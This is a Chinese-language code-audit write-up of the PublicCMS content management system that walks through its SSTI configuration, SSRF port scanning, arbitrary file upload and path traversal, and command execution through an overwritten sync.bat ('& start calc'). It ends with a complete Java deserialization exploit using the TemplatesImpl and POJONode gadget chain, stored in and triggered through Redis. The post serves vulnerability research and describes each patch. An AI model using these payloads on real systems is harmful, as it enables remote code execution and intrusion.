前言

最近偶然看见了一篇关于PublicCms的后台RCE文章，好奇心驱使之下，开始搜索PublicCms，查了一下，忽然发现这个历史久远的cms忽然在近期被申请了不少的cve，好奇心突发，于是决定先自己审计一遍存在漏洞的版本，然后将审计出来的漏洞和cve，github的issue来进行一波对比，看看有哪些自己没有发现的，提高自我水平。在本篇中，只挑选几种代表性的漏洞类型以及感兴趣的漏洞进行分享，有的只是思路，并没有利用成功，感兴趣的师傅可以再看一看进一步深挖。

https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=publiccms

https://github.com/sanluan/PublicCMS/issues

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448422.png)

环境搭建

先下载源码：

https://github.com/sanluan/PublicCMS/archive/refs/tags/V5.202302.e.zip

下载后搭建docker容器，然后将容器中的war包复制出来

```
docker cp 553f5a:/opt/publiccms.war publiccms.war
```

然后本地使用java -jar启动war包，连接idea调试

```
java -jar -Dfile.encoding="UTF-8" -Dcms.port=8088 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Dcms.contextPath=/publiccms -Dcms.filePath="datapubliccms" D:shenjipubliccms.war
```

1.Freemaker SSTI

审计Freemaker SSti注入，先看代码中关于freemaker是如何配置的，找到configuration的配置

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/8-1728448423.png)

Configurable.setAPIBuiltinEnabled：通过它可以访问底层Java Api Freemarker的BeanWrappers，禁用使得模板不能直接访问Java API

TemplateClassResolver：有三个预定义的解析器

- UNRESTRICTED_RESOLVER：

  简单地调用ClassUtil.forName(String)。

- SAFER_RESOLVER：

  和第一个类似，但禁止解析ObjectConstructor, Execute和freemarker.template.utility.JythonRuntime。

- ALLOWS_NOTHING_RESOLVER：

  禁止解析任何类。

在网站的关于freemaker的调用中查看上面的效果

在模板中加入${3+3}

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448425.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/6-1728448425.png)

我们可以看到已经成功解析，尝试加入恶意代码

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/3-1728448426.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/8-1728448427.png)

因为上面的[ 安全](https://cn-sec.com/archives/3245775.html#)配置，导致无法调用java内置api，所以在这里freemaker相关的漏洞基本上可以跳过了，审计ssti的时候思路一般可以先看配置，如果这个框架使用了ssti并且在配置中并没有考虑的非常周全的话，那么大概率会存在相关的漏洞。

2.SSRF

在快速审计的时候，我一般两种思路来审计，一种就是敏感函数方法回溯(反向审计),另一种就是特殊功能以及可控参数来进行追踪(正向审计)，在这一次中，我主要是根据敏感函数来追踪寻找漏洞

2.1CVE-2024-40543 UeditorAdminController.java

我们查看代码，发现在

UeditorAdminController.java中的catchimage方法中调用了httpclient.execute方法

httpclient.execute 是 Apache HttpClient 库中的一个方法，用于执行 HTTP 请求。具体来说，它可以发送 HTTP 请求并接收响应。

主要用途：

- 发送请求：通过此方法可以发送各种类型的 HTTP 请求（如 GET、POST、PUT、DELETE）。
- 接收响应：方法返回一个 HttpResponse 对象，包含了请求的响应信息，如状态码、响应头和响应体。

毫无疑问，如果这个函数的目标地址是受我们控制的话，那么就相当于我们能操控目标服务器来访问任意的目标地址，也就是SSRF漏洞

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/9-1728448428.png)

查看这部分代码，这个接口的本质是一个上传图片的接口，但是支持在线图片的抓取功能，url受我们控制，所以出现了ssrf漏洞

当我们输入一个正常的png图片连接时，可以看到返回了上传成功的回应

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/5-1728448430.png)

当我输入一个存在的正常url链接时，可以看到他已经成功请求到链接的内容了

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/4-1728448431.png)

但是因为这是个网络链接，不属于图片，所以会在代码的图片判断中失败，跳过后续过程，直接输出空

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/4-1728448432.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448432.png)

但是在最后的输出有个很有意思的地方，那就是你访问的链接有内容，但不是图片类型的，就会输出文件不能为空，但是如果是程序报错的话，就输出报错信息

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/3-1728448433.png)

我们利用这个差别进行端口测试：

先测试一个不存在的端口3066

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/7-1728448435.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/7-1728448436.png)

再测试一个存在的数据库端口3306

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/3-1728448437.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/8-1728448438.png)

我们可以看到两种返回的内容和时间都不同，因为存在但是判断不通过的话，响应时间会很短，而因为链接地址或端口不存在的话，他就会持续访问直到超时，最后才返回一个超时的错误，这也是时间为什么差别很大的原因。

拓展

这个端口也有上传的功能，但是在代码中，先是对于类型进行了判断，就算你绕过了对于文件的判断，还会在保存处将文件改名

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/1-1728448439.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/8-1728448439.png)

所以这一点的文件上传中先是对文件进行了类型判断，最后还改名，文件上传漏洞很难出现了

修补

在2021年就有人发现了问题，不过第一次修补只是在代码中添加了对于文件图片的验证

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/5-1728448440.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/9-1728448441.png)

2.2 CVE-2023-48204 GetHtmlMethod.java

发现开发者偏爱使用HttpClient.execute()后，继续搜索

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448442.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/4-1728448443.png)

发现这是一个接口，不过前提需要知道appToken

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/3-1728448445.png)

通过时间也可以判断端口的开放情况

修补

加入了对于site的判断

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448446.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448446-1.png)

3.文件上传

3.1 /publiccms/admin/cmsWebFile/save

延续上面的反向敏感函数方法，继续审计

我们搜索文件操作的代码FileUtils.writeStringToFile

发现在CmsFileUtils.java的createFile方法中有关于文件的操作，这个明显是一个写好的工具方法，我们继续寻找谁调用了它

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/7-1728448447.png)

在/CmsWebFile/save接口代码中发现了调用，像这个是没有目录穿越漏洞的，因为在getWebFilePath中最后会调用getSafeFileName来检测目录穿越[ 安全](https://cn-sec.com/archives/3245775.html#)性问题，检测到..会自动替换为空

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/1-1728448449.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448450.png)

虽然不能穿越目录，只能上传文件到当前目录，但是没有对文件进行安全性检测和限制

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/5-1728448451.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/10-1728448452.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/5-1728448452.png)

试着上传jsp文件，但是服务器不会执行，所以感觉这个漏洞比较鸡肋，不过可能会有其他的利用方式，下来可以研究一手

3.2 /publiccms/admin/cmsWebFile/doUpload

在doupload接口中，发现也有安全方法保护，导致没办法进行目录跨越上传，但是上传方法中没有进行文件类型的限制，所以可以上传任意文件

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/10-1728448453.png)

但是可以上传一个html静态文件，能够运行script代码

试着上传jsp文件，但是服务器不会执行，可以尝试其他方法

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/10-1728448454.png)

3.3/publiccms/admin/cmsTemplate/replace?navTabId=placeTemplate/list

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/8-1728448455.png)

filePath获得是当前的地址，然后传入了replaceFileList方法中

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/3-1728448457.png)

在replaceFileList方法中没有安全的目录限制，导致了目录穿越的漏洞，造成可以写入任意文件的漏洞

修补

添加了咱们上面说的安全方法，对..进行过滤

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/10-1728448458.png)

4.命令执行

上面都是通过敏感函数来反溯功能，但是在网站中发现了一个特别的功能，就是在站点维护处有一个执行脚本的功能，我们这里就通过功能及可控参数来进行审计

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/10-1728448459.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/10-1728448460.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/4-1728448460.png)

我们查看代码，先是在接口代码处使用了scriptComponent的execute方法,跟进

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/4-1728448462.png)

在本方法中显示对脚本名进行判断，下来就是配置的处理和加载，在方法的后半部分中执行了命令，执行的是脚本中的内容

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/9-1728448463.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/3-1728448464.png)

但是执行脚本是系统内置的，没有功能直接对其修改，但是在上面的CVE-2024-40547，这是个能跨目录的文件写入漏洞，我们可以利用这个漏洞先对脚本文件内容进行写入，然后再来执行是不是就造成了命令执行，我们来尝试一下。

sync.bat文件内容默认为

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/7-1728448464.png)

我们平常执行发现echo打印的是siteId not config!，当前操作走的是siteid为空的逻辑，所以我们将上面执行的命令替换为siteId not config! & start calc

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/3-1728448465.png)

我们将echo "siteId not config!"替换成echo "siteId not config!" & start calc，然后执行脚本

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448466.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/1-1728448467.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448468.png)

修补

添加了咱们上面说的[ 安全](https://cn-sec.com/archives/3245775.html#)方法，对..进行过滤

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/7-1728448468.png)

3.反序列化

3.1 DictAdminController

查询反序列化操作，发现readFromCoreMem出现了反序列化，往上寻找

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/3-1728448469.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/6-1728448470.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448471.png)

可以看到，在dict/save接口中调用了generate方法，该方法又调用了readFromCoreMem方法来对一个文件的内容进行读取，然后进行反序列化操作，在经历过之前命令执行的审计之后，我第一反应是通过替换hhmm/coredict.mem的内容就等于我们控制了反序列化的入口，而且这里没有任何的限制，这里的反序列化链是通的

从(入口)save-----(gadget)generate---(执行点)oistream.readobject，但是就是文件内容成了问题，目前没有找到该文件路径，下来可以多看下，只当给各位提供了一个思路

3.2  （CVE-2023-46990）通过redis缓存触发反序列化rce

在看cve列表的时候，当看到反序列化的时候是最感兴趣的，因为在查看cve之前，我是自己先把框架基本审计了一遍，有一些审计出来的漏洞和cve的基本相同，但是反序列化的只有上面的一个思路，没想到还有高手，于是赶紧跟进查看细节

这个cve作者的思路链接：

https://github.com/sanluan/PublicCMS/issues/76

查看之后疑问更多了，在问题中作者只说了在redis缓存中，但是放出来的细节只是一个demo，我们在代码中搜索一下，在redis缓存代码中，发现有反序列化操作

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/2-1728448472.png)

这才恍然大悟，因为在之前自己审计代码的哪一遍当中，我也看到了这个地方，但是因为在publiccms当中没有发现有功能利用到redis，所以简单的认为这个地方没有办法利用，直接跳过了

结合作者简单的poc，利用链就是BadAttributeValueExpException->POJOnode->TemplatesImpl，但是核心触发的地方在redis进行读取的地方

重写POJOnode1方法

```
package org.example;import com.fasterxml.jackson.databind.node.POJONode;import java.util.GregorianCalendar;public class POJOnode1 extends POJONode {    public POJOnode1(Object v) {        super(v);    }    Object writeReplace() {        GregorianCalendar NodeSerialization;        return this;    }}
```

poc

```
public class public_cms {    public static void main( String[] args ) throws Exception {        ClassPool pool = ClassPool.getDefault();        CtClass ctClass = pool.makeClass("a");        CtClass superClass = pool.get(AbstractTranslet.class.getName());        ctClass.setSuperclass(superClass);        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);        constructor.setBody("{ Runtime.getRuntime().exec("calc.exe"); }");        ctClass.addConstructor(constructor);        byte[] bytes = ctClass.toBytecode();        TemplatesImpl templatesImpl = new TemplatesImpl();        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});        setFieldValue(templatesImpl, "_name", "boogipop");        setFieldValue(templatesImpl, "_tfactory", null);        POJOnode1 jsonNodes = new POJOnode1(templatesImpl);        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");        val.setAccessible(true);        val.set(exp,jsonNodes);        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);        objectOutputStream.writeObject(exp);        FileOutputStream fout=new FileOutputStream("1.ser");        fout.write(barr.toByteArray());        fout.close();        FileInputStream fileInputStream = new FileInputStream("1.ser");        System.out.println(serial(exp));        System.out.println(deserial());    }    public static byte[] serial(Object o) throws IOException, NoSuchFieldException {        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(o);        oos.close();        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());        System.out.println(bytesToHex(baos.toByteArray()));// 设置Redis数据库连接参数        String host = "127.0.0.1";        int port = 6379;        String password = "";        Jedis jedis = new Jedis(host, port);//        jedis.auth(password);        jedis.set("test".getBytes(), baos.toByteArray());        return baos.toByteArray();    }    public static Object deserial() throws IOException, ClassNotFoundException {        // 设置Redis数据库连接参数        String host = "127.0.0.1";        int port = 6379;        String password = "";        Jedis jedis = new Jedis(host, port);        // jedis.auth(password);        byte[] data = jedis.get("test".getBytes());        if (data == null) {            throw new IOException("No data found in Redis for key 'test'");        }        System.out.println(bytesToHex(data));        ByteArrayInputStream bais = new ByteArrayInputStream(data);        ObjectInputStream ois = new ObjectInputStream(bais);        Object o = ois.readObject();        ois.close();        return o;    }    public static String bytesToHex(byte[] bytes) {        StringBuilder hexString = new StringBuilder();        for (byte b : bytes) {            // 将每个字节转换为两个十六进制字符            String hex = Integer.toHexString(0xFF & b);            if (hex.length() == 1) {                // 如果只有一个字符，前面补0                hexString.append('0');            }            hexString.append(hex);        }        return hexString.toString();    }    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj, value);    }}
```

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/4-1728448473.png)

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/1-1728448474.png)

拓展

在这个地方，之前是真的没考虑过redis的影响，在发现之后，去网上也搜了一下redis的反序列化，出现了一些例子，比如shiro和redis结合的反序列化漏洞，下来审计其他涉及redis的框架代码时可以注意这方面

修补

![开源框架PublicCMS的一次简单代码审计](http://cn-sec.com/wp-content/uploads/2024/10/5-1728448475.png)